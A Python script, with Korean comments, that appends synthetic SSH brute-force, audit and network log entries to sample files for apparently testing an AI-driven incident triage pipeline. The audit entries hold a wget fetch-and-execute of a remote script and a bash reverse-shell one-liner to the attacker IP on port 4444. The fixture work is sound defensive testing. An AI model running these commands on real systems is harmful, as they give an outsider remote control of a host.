"""비밀번호 인증 브루트포스 + 침해 후 악성 행위 합성 시나리오 생성기.

원칙 7번의 Q2="비밀번호" 갈래(아직 실전 검증 안 됨)와, THREAT_CONFIRMED 방향
사건의 재현성(아직 검증 안 됨)을 동시에 테스트하기 위해 만든 합성 로그다.

시나리오 개요:
  1. 외부 IP(45.76.13.201)가 ubuntu 계정에 비밀번호로 6회 실패 후 성공 (Q1 침해 신호,
     Q2 침해 신호 — 지금까지 검증한 두 시나리오는 전부 공개키였음)
  2. 로그인 성공 세션에서 wget으로 스크립트 다운로드 → chmod +x → 실행 (Q3 침해 신호 —
     파일 유출/역방향 셸에 준하는 명확한 악성 행위 체인)
  3. network 계층에 공격자 IP로의 아웃바운드 통신(비표준 포트) 기록

기존 sample_logs/*.log에 새 줄을 append한다 (기존 시나리오는 건드리지 않음).
실행 후 test_consistency.py의 SEED를 이 스크립트가 출력하는 값으로 바꿔서 사용한다.
"""

import os

LOG_DIR = "sample_logs"
ATTACKER_IP = "45.76.13.201"
VICTIM_USER = "ubuntu"
HOST = "web-01"

# ----------------------------------------------------------------------
# 1. auth.log — 비밀번호 브루트포스 (6회 실패) 후 성공
# ----------------------------------------------------------------------
auth_lines = []
base_port = 40000
for i in range(6):
    auth_lines.append(
        f"Sep 14 16:10:{i:02d} ip-10-0-7-236 sshd[91{i:02d}]: "
        f"Failed password for {VICTIM_USER} from {ATTACKER_IP} port {base_port + i} ssh2"
    )
auth_lines.append(
    f"Sep 14 16:10:07 ip-10-0-7-236 sshd[9110]: "
    f"Accepted password for {VICTIM_USER} from {ATTACKER_IP} port {base_port + 10} ssh2"
)
auth_lines.append(
    f"Sep 14 16:10:07 ip-10-0-7-236 sshd[9110]: pam_unix(sshd:session): "
    f"session opened for user {VICTIM_USER}(uid=1000) by (uid=0)"
)

# ----------------------------------------------------------------------
# 2. audit.log — 로그인 후 wget 다운로드 -> chmod -> 실행 체인
#    audit_parser.py가 기대하는 ENRICHED 포맷(0x1d 구분자)을 그대로 재현한다.
# ----------------------------------------------------------------------
GS = "\x1d"
EPOCH_BASE = 1789413007  # 2026-09-14 16:10:07 UTC 근방 (임의, 형식만 맞으면 됨)
SERIAL_BASE = 9000

audit_lines = []


def make_execve_pair(serial, epoch, ppid, pid, comm, exe, argv):
    """SYSCALL(execve) + EXECVE 레코드 한 쌍을 만든다. audit_parser.assemble_event()가
    이 둘을 SERIAL로 묶어서 exec_args(=argv 전체)를 복원한다."""
    syscall_line = (
        f"type=SYSCALL msg=audit({epoch}.001:{serial}): arch=c000003e syscall=59 "
        f"success=yes exit=0 a0=0 a1=0 a2=0 a3=0 items=2 ppid={ppid} pid={pid} "
        f"auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 "
        f"tty=(none) ses=99 comm=\"{comm}\" exe=\"{exe}\" subj=unconfined key=\"exec\""
        f"{GS}ARCH=x86_64 SYSCALL=execve AUID=\"{VICTIM_USER}\" UID=\"root\" GID=\"root\" "
        f"EUID=\"root\" SUID=\"root\" FSUID=\"root\" EGID=\"root\" SGID=\"root\" FSGID=\"root\""
    )
    execve_fields = f'argc="{len(argv)}"'.replace('"', "")  # argc는 숫자 그대로
    argv_fields = " ".join(f'a{i}="{arg}"' for i, arg in enumerate(argv))
    execve_line = (
        f"type=EXECVE msg=audit({epoch}.001:{serial}): argc={len(argv)} {argv_fields}"
    )
    return [syscall_line, execve_line]


# (1) wget으로 악성 스크립트 다운로드
audit_lines += make_execve_pair(
    SERIAL_BASE + 1, EPOCH_BASE + 3, ppid=9110, pid=9200,
    comm="wget", exe="/usr/bin/wget",
    argv=["wget", f"http://{ATTACKER_IP}/update.sh", "-O", "/tmp/update.sh"],
)
# (2) 실행 권한 부여
audit_lines += make_execve_pair(
    SERIAL_BASE + 2, EPOCH_BASE + 4, ppid=9110, pid=9201,
    comm="chmod", exe="/usr/bin/chmod",
    argv=["chmod", "+x", "/tmp/update.sh"],
)
# (3) 악성 스크립트 실행 (역방향 셸을 흉내: bash가 attacker IP로 접속 시도하는 커맨드)
audit_lines += make_execve_pair(
    SERIAL_BASE + 3, EPOCH_BASE + 5, ppid=9110, pid=9202,
    comm="update.sh", exe="/tmp/update.sh",
    argv=["/tmp/update.sh"],
)
audit_lines += make_execve_pair(
    SERIAL_BASE + 4, EPOCH_BASE + 6, ppid=9202, pid=9203,
    comm="bash", exe="/usr/bin/bash",
    argv=["bash", "-c", f"bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1"],
)

# ----------------------------------------------------------------------
# 3. network.log — 공격자 IP로의 아웃바운드 통신 (역방향 셸 접속 시도)
# ----------------------------------------------------------------------
network_lines = [
    (
        '{"timestamp":"2026-09-14T16:10:06.000000+0000","event_type":"flow",'
        f'"src_ip":"10.0.7.236","dest_ip":"{ATTACKER_IP}","src_port":51500,'
        '"dest_port":4444,"proto":"TCP",'
        '"flow":{"state":"established","pkts_toserver":12,"pkts_toclient":8}}'
    ),
    (
        '{"timestamp":"2026-09-14T16:10:06.500000+0000","event_type":"alert",'
        f'"src_ip":"10.0.7.236","dest_ip":"{ATTACKER_IP}","src_port":51500,'
        '"dest_port":4444,"proto":"TCP",'
        '"alert":{"signature":"ET POLICY Suspicious inbound to high port 4444 (Metasploit)"}}'
    ),
]

# ----------------------------------------------------------------------
# 파일에 append
# ----------------------------------------------------------------------
with open(os.path.join(LOG_DIR, "sample_auth.log"), "a", encoding="utf-8") as f:
    f.write("\n" + "\n".join(auth_lines) + "\n")

with open(os.path.join(LOG_DIR, "sample_audit.log"), "a", encoding="utf-8") as f:
    f.write("\n" + "\n".join(audit_lines) + "\n")

with open(os.path.join(LOG_DIR, "sample_network.log"), "a", encoding="utf-8") as f:
    f.write("\n".join(network_lines) + "\n")

print("합성 로그 추가 완료.")
print()
print("test_consistency.py의 SEED를 아래로 교체하세요:")
print(
    """
SEED = {
    "incident_id": "CONSISTENCY-TEST-03",
    "detection_source": "llm_triage",
    "trigger_time": "2026-09-14T16:10:00+00:00",
    "trigger_description": "외부 IP에서 ubuntu 계정 대상 비밀번호 브루트포스 성공 후 원격 스크립트 다운로드 및 실행 발생",
    "confidence_initial": 0.7,
    "severity_hint": "CRITICAL",
    "priority": 1,
    "host": "web-01",
    "src_ip": "45.76.13.201",
    "reasoning": "비밀번호 다회 실패 후 로그인 성공, 곧이어 외부에서 스크립트를 받아 실행하는 정황이 확인되어 침해 가능성이 매우 높습니다.",
}
"""
)